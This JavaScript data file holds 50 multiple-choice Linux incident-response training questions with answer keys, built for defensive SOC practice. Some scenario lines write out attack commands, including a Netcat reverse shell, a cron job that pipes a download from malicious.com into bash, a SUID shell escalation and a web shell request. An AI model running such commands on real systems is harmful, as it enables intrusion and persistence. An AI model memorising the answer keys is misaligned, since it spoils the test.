// --- 50 REAL-WORLD LINUX SOC INCIDENT RESPONSE LAB QUESTIONS ---
const INCIDENT_LABS = [
  {
    id: "lab1",
    title: "Lab 1: Rogue Cryptominer Process Triage",
    desc: "A CPU usage alert spiked to 99%. Analyst notices a process running under /tmp/.miner.py.",
    question: "Which Linux command should you run to verify the executable binary location of PID 8812?",
    options: [
      "ls -la /proc/8812/exe",
      "cat /etc/passwd",
      "uname -a",
      "chmod 777 /tmp"
    ],
    answer: 0,
    explanation: "Correct! /proc/<PID>/exe points directly to the file executable path on Linux."
  },
  {
    id: "lab2",
    title: "Lab 2: Unauthorized SSH Key Injection",
    desc: "An attacker gained access and injected a persistent SSH public key for passwordless entry.",
    question: "In which user file would an attacker add their public key for persistent SSH access?",
    options: [
      "/var/log/auth.log",
      "~/.ssh/authorized_keys",
      "/etc/sudoers",
      "/tmp/key.txt"
    ],
    answer: 1,
    explanation: "Correct! ~/.ssh/authorized_keys stores trusted public keys for SSH authentication."
  },
  {
    id: "lab3",
    title: "Lab 3: SUID GTFOBins Privilege Escalation",
    desc: "An attacker executed 'find . -exec /bin/sh \\;' to escalate from unprivileged user to root.",
    question: "Which permission bit on the 'find' binary allowed execution as root user?",
    options: [
      "SUID bit (chmod u+s /usr/bin/find)",
      "SGID bit (chmod g+s)",
      "Sticky bit (chmod +t)",
      "Read-only permission (chmod 444)"
    ],
    answer: 0,
    explanation: "Correct! SUID (Set User ID) executes the binary with the owner (root) privileges."
  },
  {
    id: "lab4",
    title: "Lab 4: Suspicious Listening Port Investigation",
    desc: "SIEM alert shows a suspicious socket listening on TCP port 4444.",
    question: "Which command shows both the listening port and the associated PID / Process Name?",
    options: [
      "ss -tulpn | grep 4444",
      "ping 127.0.0.1",
      "ifconfig eth0",
      "traceroute 8.8.8.8"
    ],
    answer: 0,
    explanation: "Correct! 'ss -tulpn' displays numeric TCP/UDP ports along with process names and PIDs."
  },
  {
    id: "lab5",
    title: "Lab 5: Anti-Forensics Log Clearing Detection",
    desc: "An attacker ran '> /var/log/auth.log' to wipe login traces.",
    question: "Which command reveals recently executed commands in the analyst's active shell session?",
    options: [
      "history | tail -n 20",
      "df -h",
      "uptime",
      "hostname"
    ],
    answer: 0,
    explanation: "Correct! 'history' prints the logged command history for the active Bash session."
  },
  {
    id: "lab6",
    title: "Lab 6: Reverse Shell Network Connection Triage",
    desc: "An attacker established an outbound TCP connection using Netcat (`nc -e /bin/bash 10.0.0.5 4444`).",
    question: "Which command lists open network files and remote sockets for a specific PID 4512?",
    options: [
      "lsof -p 4512",
      "cat /etc/hosts",
      "chmod +x /bin/bash",
      "whoami"
    ],
    answer: 0,
    explanation: "Correct! 'lsof -p <PID>' lists all open file descriptors, network sockets, and pipes for that process."
  },
  {
    id: "lab7",
    title: "Lab 7: Persistence via Cron Job Injection",
    desc: "A malicious entry `*/5 * * * * curl http://malicious.com/s.sh | bash` was discovered.",
    question: "Where are user-specific crontab files stored on Debian/Ubuntu Linux systems?",
    options: [
      "/var/spool/cron/crontabs/",
      "/etc/environment",
      "/lib/systemd/system/",
      "/tmp/cron.log"
    ],
    answer: 0,
    explanation: "Correct! User crontabs are stored under /var/spool/cron/crontabs/ (or /var/spool/cron/)."
  },
  {
    id: "lab8",
    title: "Lab 8: Systemd Backdoor Service Triage",
    desc: "An adversary created a persistence service `/etc/systemd/system/backdoor.service`.",
    question: "Which systemctl command stops and prevents the rogue service from starting on reboot?",
    options: [
      "sudo systemctl disable --now backdoor.service",
      "sudo systemctl start backdoor.service",
      "sudo systemctl status backdoor.service",
      "sudo systemctl reload backdoor.service"
    ],
    answer: 0,
    explanation: "Correct! 'disable --now' stops the running service immediately and disables autostart on boot."
  },
  {
    id: "lab9",
    title: "Lab 9: /etc/shadow Hash Dumping",
    desc: "An unprivileged user gained root and extracted password hashes.",
    question: "What are the standard security permissions on `/etc/shadow` file?",
    options: [
      "600 (-rw-------) owned by root:root",
      "777 (-rwxrwxrwx)",
      "644 (-rw-r--r--)",
      "444 (-r--r--r--)"
    ],
    answer: 0,
    explanation: "Correct! /etc/shadow must be restricted to 600 or 640 root access only to prevent hash dumping."
  },
  {
    id: "lab10",
    title: "Lab 10: Web Shell Command Execution in Apache",
    desc: "Apache access logs show `GET /uploads/c99.php?cmd=id HTTP/1.1 200`.",
    question: "Which Web server process user runs Apache by default on Debian/Ubuntu?",
    options: [
      "www-data",
      "nobody",
      "root",
      "nginx"
    ],
    answer: 0,
    explanation: "Correct! Apache runs under the low-privileged user account 'www-data' on Debian/Ubuntu."
  },
  {
    id: "lab11",
    title: "Lab 11: Linux PAM Module Tampering",
    desc: "An attacker placed a malicious `pam_unix.so` module to accept a master backdoor password.",
    question: "Which directory holds Linux Pluggable Authentication Modules (PAM) configuration files?",
    options: [
      "/etc/pam.d/",
      "/var/log/pam/",
      "/usr/local/pam/",
      "/home/pam/"
    ],
    answer: 0,
    explanation: "Correct! /etc/pam.d/ contains authentication rules for login, sudo, and SSH services."
  },
  {
    id: "lab12",
    title: "Lab 12: Hidden File & Directory Enumeration",
    desc: "Attacker hid malware in `/tmp/.hidden_dir/malware`.",
    question: "Which flag with `ls` displays hidden files starting with a dot (`.`)?",
    options: [
      "ls -la",
      "ls -h",
      "ls -S",
      "ls -t"
    ],
    answer: 0,
    explanation: "Correct! 'ls -a' (or -la) includes hidden files beginning with a dot."
  },
  {
    id: "lab13",
    title: "Lab 13: Kernel Exploit Mitigation (Dirty COW / Pkexec)",
    desc: "CVE-2021-4034 (Pkit/Pkexec) allowed local privilege escalation to root.",
    question: "Which command temporarily mitigates pkexec vulnerability by removing SUID bit?",
    options: [
      "sudo chmod 0755 /usr/bin/pkexec",
      "sudo chmod 4755 /usr/bin/pkexec",
      "sudo chown nobody /usr/bin/pkexec",
      "sudo rm -rf /usr/bin/pkexec"
    ],
    answer: 0,
    explanation: "Correct! Removing SUID (chmod 0755) prevents unprivileged users from executing pkexec as root."
  },
  {
    id: "lab14",
    title: "Lab 14: SSH Brute Force Incident Response",
    desc: "Auth log displays over 5,000 Failed password attempts from IP 198.51.100.45.",
    question: "Which Linux service automatically blocks IP addresses after repeated failed login attempts?",
    options: [
      "fail2ban",
      "rsyslog",
      "cron",
      "netplan"
    ],
    answer: 0,
    explanation: "Correct! fail2ban monitors log files and updates firewall rules to block brute-forcing IPs."
  },
  {
    id: "lab15",
    title: "Lab 15: Memory Dump Analysis with Volatility",
    desc: "Analyst is analyzing a raw Linux RAM dump file `lime.raw`.",
    question: "Which Volatility 3 command lists Linux processes running at the time of RAM acquisition?",
    options: [
      "vol.py -f lime.raw linux.pslist",
      "vol.py -f lime.raw windows.pstree",
      "vol.py -f lime.raw dumpfiles",
      "vol.py -f lime.raw netscan"
    ],
    answer: 0,
    explanation: "Correct! 'linux.pslist' iterates through kernel task_struct list to extract active processes."
  },
  {
    id: "lab16",
    title: "Lab 16: Environment Variable Hijacking (.bashrc)",
    desc: "An attacker appended `alias sudo='/tmp/fake_sudo'` inside a user's `.bashrc`.",
    question: "Which command safely displays aliases configured in the current shell session?",
    options: [
      "alias",
      "env",
      "export",
      "set"
    ],
    answer: 0,
    explanation: "Correct! Running 'alias' prints all configured shell command aliases."
  },
  {
    id: "lab17",
    title: "Lab 17: Auditd System Call Monitoring",
    desc: "SOC team wants to track all execution calls to `/usr/bin/nc`.",
    question: "Which auditctl rule logs all executions of `/usr/bin/nc` with key `nc_exec`?",
    options: [
      "auditctl -w /usr/bin/nc -p x -k nc_exec",
      "auditctl -r /usr/bin/nc",
      "auditctl -d /usr/bin/nc",
      "auditctl -e 0"
    ],
    answer: 0,
    explanation: "Correct! '-w /path -p x -k key' sets a watch for execution (-p x) tagged with a custom key."
  },
  {
    id: "lab18",
    title: "Lab 18: File Integrity Monitoring (AIDE / Tripwire)",
    desc: "System files in `/usr/bin` were modified during an incident.",
    question: "Which hash algorithm is commonly computed by FIM tools to verify file integrity?",
    options: [
      "SHA-256",
      "ROT13",
      "Base64",
      "ASCII"
    ],
    answer: 0,
    explanation: "Correct! SHA-256 provides a cryptographic checksum to detect file modifications."
  },
  {
    id: "lab19",
    title: "Lab 19: Rogue User Account Creation Detection",
    desc: "An attacker created an unauthorized user `backdoor_user` with UID 0.",
    question: "Which file defines user account UIDs and default login shell paths on Linux?",
    options: [
      "/etc/passwd",
      "/etc/resolv.conf",
      "/etc/hosts",
      "/etc/issue"
    ],
    answer: 0,
    explanation: "Correct! /etc/passwd stores user account usernames, UIDs, GIDs, home dirs, and default shells."
  },
  {
    id: "lab20",
    title: "Lab 20: Sudoers NOPASSWD Abuse Investigation",
    desc: "Attacker added `analyst ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers`.",
    question: "Which command securely edits and validates syntax for `/etc/sudoers` file?",
    options: [
      "visudo",
      "nano /etc/sudoers",
      "vim /etc/sudoers",
      "cat > /etc/sudoers"
    ],
    answer: 0,
    explanation: "Correct! 'visudo' locks the sudoers file and verifies syntax before saving to prevent lockouts."
  },
  {
    id: "lab21",
    title: "Lab 21: IPTables Port Forwarding Suppression",
    desc: "Attacker routed external traffic on port 80 to internal port 4444 via iptables NAT.",
    question: "Which command lists all rules in the iptables NAT table with line numbers?",
    options: [
      "sudo iptables -t nat -L -n -v --line-numbers",
      "sudo ufw status",
      "sudo route -n",
      "sudo netstat -r"
    ],
    answer: 0,
    explanation: "Correct! '-t nat -L -n -v --line-numbers' displays active NAT table rules in numeric format."
  },
  {
    id: "lab22",
    title: "Lab 22: DNS Tunneling Detection",
    desc: "High volume of TXT query requests sent to domain `exfil.malicious-domain.com`.",
    question: "Which packet capture tool extracts DNS queries live from network interface `eth0`?",
    options: [
      "sudo tcpdump -i eth0 port 53",
      "sudo nmap -sU 53",
      "sudo traceroute 53",
      "sudo ping 53"
    ],
    answer: 0,
    explanation: "Correct! 'tcpdump -i eth0 port 53' captures UDP/TCP traffic on standard DNS port 53."
  },
  {
    id: "lab23",
    title: "Lab 23: Shared Memory `/dev/shm` File Execution",
    desc: "Attacker dropped a compiled binary into POSIX shared memory `/dev/shm/payload`.",
    question: "Why do attackers target `/dev/shm` for payload storage on Linux?",
    options: [
      "It is a RAM-backed world-writable directory, avoiding disk logging.",
      "It automatically encrypts files.",
      "It bypasses root password checks.",
      "It runs binaries automatically on boot."
    ],
    answer: 0,
    explanation: "Correct! /dev/shm is backed by tmpfs (RAM), allowing fast world-writable execution in memory."
  },
  {
    id: "lab24",
    title: "Lab 24: Core Dump Password Extraction",
    desc: "Attacker forced a process core dump to extract cleartext credentials from RAM.",
    question: "Which command disables core dump file creation for unprivileged user sessions?",
    options: [
      "ulimit -c 0",
      "ulimit -n 65535",
      "ulimit -u 1000",
      "ulimit -v unlimited"
    ],
    answer: 0,
    explanation: "Correct! 'ulimit -c 0' sets maximum core dump file size to 0 bytes."
  },
  {
    id: "lab25",
    title: "Lab 25: Linux Ransomware File Encryption Triage",
    desc: "Files in `/var/www/html` were renamed with `.locked` extension.",
    question: "Which command finds all files with extension `.locked` modified in the last 60 minutes?",
    options: [
      "find /var/www/html -name '*.locked' -mmin -60",
      "grep -r '.locked' /var/www/html",
      "ls -l *.locked",
      "du -sh /var/www/html"
    ],
    answer: 0,
    explanation: "Correct! 'find -name *.locked -mmin -60' searches for matching patterns modified in last 60 mins."
  },
  {
    id: "lab26",
    title: "Lab 26: Suspicious Shared Object (LD_PRELOAD) Hijack",
    desc: "Attacker set `LD_PRELOAD=/tmp/rootkit.so` in `/etc/ld.so.preload`.",
    question: "What effect does `LD_PRELOAD` have on dynamically linked C applications?",
    options: [
      "It forces applications to load specified shared library functions first.",
      "It disables network connections.",
      "It restarts the SSH daemon.",
      "It wipes system logs."
    ],
    answer: 0,
    explanation: "Correct! LD_PRELOAD overrides standard C library functions (e.g. fopen, readdir) with custom hooks."
  },
  {
    id: "lab27",
    title: "Lab 27: Journalctl System Log Forensics",
    desc: "Analyst is investigating system reboot & authentication logs via systemd journal.",
    question: "Which command filters journalctl logs for SSHD unit events from the current boot session?",
    options: [
      "journalctl -u ssh -b 0",
      "cat /var/log/messages",
      "dmesg | grep ssh",
      "tail -f /var/log/syslog"
    ],
    answer: 0,
    explanation: "Correct! 'journalctl -u ssh -b 0' shows logs for the 'ssh' service from current boot (b 0)."
  },
  {
    id: "lab28",
    title: "Lab 28: Out-of-Memory (OOM) Killer Forensic Analysis",
    desc: "A critical database service crashed unexpectedly overnight.",
    question: "Which command inspects Linux kernel ring buffer logs for OOM killer events?",
    options: [
      "dmesg -T | grep -i 'oom'",
      "cat /etc/hosts",
      "df -i",
      "free -m"
    ],
    answer: 0,
    explanation: "Correct! 'dmesg -T' displays kernel log messages with human-readable timestamps."
  },
  {
    id: "lab29",
    title: "Lab 29: SSH Port Forwarding Tunnel Detection",
    desc: "Attacker established an SSH tunnel: `ssh -N -L 8080:internal:80 victim@remote`.",
    question: "What flag in SSH command line disables execution of remote interactive commands?",
    options: [
      "-N",
      "-p",
      "-v",
      "-i"
    ],
    answer: 0,
    explanation: "Correct! The '-N' flag instructs SSH not to execute remote commands, useful for port forwarding."
  },
  {
    id: "lab30",
    title: "Lab 30: Detecting Orphaned & Zombie Processes",
    desc: "System process table has numerous processes in STAT state `Z`.",
    question: "What does state `Z` represent in `ps aux` command output?",
    options: [
      "Zombie process (terminated but uncollected parent status)",
      "Running active process",
      "Sleeping process",
      "Stopped process"
    ],
    answer: 0,
    explanation: "Correct! 'Z' indicates a Zombie process whose execution finished but parent hasn't read exit code."
  },
  {
    id: "lab31",
    title: "Lab 31: Bash History Timestamp Enabling",
    desc: "Analyst needs precise execution timestamps for commands logged in `.bash_history`.",
    question: "Which environment variable configures timestamps in Bash history files?",
    options: [
      "export HISTTIMEFORMAT='%F %T '",
      "export HISTSIZE=1000",
      "export PATH=$PATH:/usr/bin",
      "export PS1='\\u@\\h:\\w$ '"
    ],
    answer: 0,
    explanation: "Correct! Setting HISTTIMEFORMAT appends date (%F) and time (%T) prefixes to history lines."
  },
  {
    id: "lab32",
    title: "Lab 32: Docker Container Escape Investigation",
    desc: "Attacker escaped from a Docker container into host filesystem via `--privileged` flag.",
    question: "What risk is introduced by running Docker containers with `--privileged` flag?",
    options: [
      "Container gets full root capabilities and direct access to host devices.",
      "Container loses network access.",
      "Container runs in read-only mode.",
      "Container automatically deletes logs."
    ],
    answer: 0,
    explanation: "Correct! --privileged disables container isolation, granting root access to host devices."
  },
  {
    id: "lab33",
    title: "Lab 33: Logrotate Configuration Inspection",
    desc: "Auth log files are deleted automatically after 7 days.",
    question: "Which directory contains service-specific log retention rules for Logrotate?",
    options: [
      "/etc/logrotate.d/",
      "/var/log/syslog/",
      "/usr/share/logrotate/",
      "/home/logrotate/"
    ],
    answer: 0,
    explanation: "Correct! /etc/logrotate.d/ holds individual service configuration files for log rotation."
  },
  {
    id: "lab34",
    title: "Lab 34: Inspected File Capabilities (getcap / setcap)",
    desc: "Attacker assigned capability `cap_setuid+ep` to Python binary to bypass root checks.",
    question: "Which command inspects Linux file capabilities assigned to binaries under `/usr/bin`?",
    options: [
      "getcap -r /usr/bin 2>/dev/null",
      "chmod +x /usr/bin",
      "chown root:root /usr/bin",
      "lsattr /usr/bin"
    ],
    answer: 0,
    explanation: "Correct! 'getcap -r' recursively checks files for assigned POSIX capabilities."
  },
  {
    id: "lab35",
    title: "Lab 35: File Attributes Anti-Deletion Protection (`chattr`)",
    desc: "Attacker marked a malicious file immutable using `chattr +i /tmp/rootkit`.",
    question: "Which flag with `lsattr` displays extended file attributes on Linux filesystems?",
    options: [
      "lsattr /tmp/rootkit",
      "ls -l /tmp/rootkit",
      "stat /tmp/rootkit",
      "file /tmp/rootkit"
    ],
    answer: 0,
    explanation: "Correct! 'lsattr' displays file attributes like immutable (+i) or append-only (+a)."
  },
  {
    id: "lab36",
    title: "Lab 36: Identifying Promiscuous Network Interface Mode",
    desc: "Attacker ran a sniffer `tcpdump` placing `eth0` in promiscuous mode.",
    question: "Which log file records kernel warnings when an interface enters PROMISC mode?",
    options: [
      "/var/log/syslog (or dmesg)",
      "/etc/hosts",
      "/var/log/auth.log",
      "/tmp/sniff.log"
    ],
    answer: 0,
    explanation: "Correct! Kernel events log 'device eth0 entered promiscuous mode' in dmesg and syslog."
  },
  {
    id: "lab37",
    title: "Lab 37: Checking Open Network Listening Sockets via `/proc`",
    desc: "Attacker deleted `netstat` and `ss` commands to hide active listening ports.",
    question: "Which virtual file under `/proc/net/` contains hex-encoded active TCP socket connections?",
    options: [
      "/proc/net/tcp",
      "/proc/cpuinfo",
      "/proc/meminfo",
      "/proc/version"
    ],
    answer: 0,
    explanation: "Correct! /proc/net/tcp directly exposes active IPv4 TCP sockets from kernel memory."
  },
  {
    id: "lab38",
    title: "Lab 38: Detecting Suspicious `at` Job Scheduled Tasks",
    desc: "Adversary scheduled a one-time execution task using the `at` command.",
    question: "Which command lists pending jobs scheduled via the `at` daemon?",
    options: [
      "atq",
      "crontab -l",
      "systemctl list-timers",
      "ps aux"
    ],
    answer: 0,
    explanation: "Correct! 'atq' prints the queue of pending jobs scheduled via the 'at' utility."
  },
  {
    id: "lab39",
    title: "Lab 39: Detecting Unauthorized Sudo Command Privileges",
    desc: "Analyst wants to verify what sudo commands user `analyst` is authorized to run.",
    question: "Which command checks current user sudo privileges without modifying system files?",
    options: [
      "sudo -l",
      "sudo -v",
      "sudo -s",
      "sudo -i"
    ],
    answer: 0,
    explanation: "Correct! 'sudo -l' lists allowed (and forbidden) commands for the invoking user."
  },
  {
    id: "lab40",
    title: "Lab 40: Detecting Unlinked / Deleted Executable Files (`(deleted)`)",
    desc: "Attacker executed `/tmp/payload` and then deleted the binary file on disk.",
    question: "How does `ps aux` display a running process whose binary file was deleted from disk?",
    options: [
      "The path displays with suffix '(deleted)' in /proc/<PID>/exe",
      "The process automatically terminates",
      "The PID changes to 0",
      "The process name disappears"
    ],
    answer: 0,
    explanation: "Correct! The process keeps running in RAM, while /proc/<PID>/exe points to '/path/file (deleted)'."
  },
  {
    id: "lab41",
    title: "Lab 41: Securing SSH Banner Warning Message",
    desc: "Compliance audit requires displaying an authorized access warning banner before SSH login.",
    question: "Which directive in `/etc/ssh/sshd_config` specifies the path to SSH legal banner file?",
    options: [
      "Banner /etc/issue.net",
      "Motd /etc/motd",
      "PrintMotd yes",
      "Subsystem sftp"
    ],
    answer: 0,
    explanation: "Correct! 'Banner /etc/issue.net' specifies the banner file shown before authentication."
  },
  {
    id: "lab42",
    title: "Lab 42: Analysing System Memory Free Space (`free`)",
    desc: "High memory utilization alert triggered on Linux production server.",
    question: "Which `free` flag displays RAM memory sizes in human-readable Megabytes / Gigabytes?",
    options: [
      "free -h",
      "free -b",
      "free -k",
      "free -s 1"
    ],
    answer: 0,
    explanation: "Correct! 'free -h' outputs memory stats formatted in GB/MB auto-scaled units."
  },
  {
    id: "lab43",
    title: "Lab 43: Linux Firewall State Verification (UFW)",
    desc: "Checking if Uncomplicated Firewall (UFW) is active and monitoring rules.",
    question: "Which command shows detailed UFW firewall status along with rule numbers?",
    options: [
      "sudo ufw status numbered",
      "sudo ufw show",
      "sudo ufw list",
      "sudo ufw check"
    ],
    answer: 0,
    explanation: "Correct! 'sudo ufw status numbered' lists active firewall rules along with index IDs."
  },
  {
    id: "lab44",
    title: "Lab 44: Investigating `/var/tmp` World-Writable Sticky Bit",
    desc: "Attacker leveraged `/var/tmp` directory to store persistent malware across reboots.",
    question: "What is the difference between `/tmp` and `/var/tmp` on standard Linux systems?",
    options: [
      "/var/tmp files survive system reboots, while /tmp is cleared on reboot.",
      "/tmp requires root permission to write files.",
      "/var/tmp is read-only.",
      "/tmp is encrypted automatically."
    ],
    answer: 0,
    explanation: "Correct! /tmp uses tmpfs (RAM/cleared on reboot), whereas /var/tmp is stored on disk."
  },
  {
    id: "lab45",
    title: "Lab 45: Triage of High Disk Space Usage (`du` / `df`)",
    desc: "Disk space on root partition `/` reached 100% full.",
    question: "Which command identifies the top 5 largest directories under `/var`?",
    options: [
      "du -h /var | sort -rh | head -n 5",
      "df -h /var",
      "ls -l /var",
      "stat /var"
    ],
    answer: 0,
    explanation: "Correct! 'du -h | sort -rh' ranks directory disk usage in human-readable reverse order."
  },
  {
    id: "lab46",
    title: "Lab 46: Investigating Syslog Daemon Configuration",
    desc: "SOC team needs to forward Linux syslog events to a remote SIEM server.",
    question: "Which main configuration file configures log forwarding rules in Rsyslog?",
    options: [
      "/etc/rsyslog.conf",
      "/etc/syslog-ng/syslog-ng.conf",
      "/etc/systemd/journald.conf",
      "/etc/logrotate.conf"
    ],
    answer: 0,
    explanation: "Correct! /etc/rsyslog.conf defines log facilities, rules, and remote SIEM output targets."
  },
  {
    id: "lab47",
    title: "Lab 47: Detecting Outbound Reverse Shell in `/proc/<PID>/cmdline`",
    desc: "Analyst is inspecting command-line parameters of a suspicious process PID 9912.",
    question: "Which virtual proc file contains null-delimited full command-line arguments for a PID?",
    options: [
      "/proc/9912/cmdline",
      "/proc/9912/environ",
      "/proc/9912/status",
      "/proc/9912/cwd"
    ],
    answer: 0,
    explanation: "Correct! /proc/<PID>/cmdline contains the exact full startup command line parameters."
  },
  {
    id: "lab48",
    title: "Lab 48: Verification of Password Complexity PAM Policy",
    desc: "Auditing Linux password policy rules for minimum length and character requirements.",
    question: "Which PAM module file configures minimum password length and complexity rules?",
    options: [
      "/etc/security/pwquality.conf",
      "/etc/pam.d/common-password",
      "/etc/login.defs",
      "All of the above"
    ],
    answer: 3,
    explanation: "Correct! Password policies are controlled across pwquality.conf, common-password, and login.defs."
  },
  {
    id: "lab49",
    title: "Lab 49: Identifying Current Active Logged-in Users",
    desc: "Analyst needs to verify who is currently logged into the Linux system via SSH or TTY.",
    question: "Which Linux command displays active user sessions, login times, and remote IP addresses?",
    options: [
      "w (or who)",
      "lastlog",
      "id",
      "uname -r"
    ],
    answer: 0,
    explanation: "Correct! 'w' (and 'who') displays logged-in users, TTYs, login times, and idle status."
  },
  {
    id: "lab50",
    title: "Lab 50: Hardening `/etc/gshadow` & `/etc/group` Permissions",
    desc: "SOC Analyst is performing final CIS Benchmark file permission audits.",
    question: "What are the recommended secure permissions for `/etc/gshadow` file?",
    options: [
      "640 (-rw-r-----) or 600 (-rw-------) owned by root:shadow",
      "777 (-rwxrwxrwx)",
      "644 (-rw-r--r--)",
      "755 (-rwxr-xr-x)"
    ],
    answer: 0,
    explanation: "Correct! /etc/gshadow contains secure group passwords and must be restricted to 640/600 shadow group."
  }
];
